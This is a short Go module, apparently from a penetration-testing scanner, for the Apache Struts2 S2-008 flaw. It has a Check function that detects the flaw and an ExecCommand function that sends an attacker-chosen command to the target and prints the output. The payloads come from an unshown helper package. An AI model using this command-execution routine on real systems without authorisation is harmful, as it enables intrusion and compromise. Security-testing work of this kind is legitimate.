package s2_008

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
)

func Check(targetUrl string) {
    respString := utils.GetFunc4Struts2(targetUrl, "", utils.POC_s008_check)
    if utils.IfContainsStr(respString, utils.Checkflag) {
        color.Red("*Found Struts2-008！")
    } else {
        fmt.Println("Struts2-008 Not Vulnerable.")
    }
}
func ExecCommand(targetUrl string, command string) {
    respString := utils.GetFunc4Struts2(targetUrl, "", utils.POC_s008_exec(command))
    fmt.Println(respString)
}
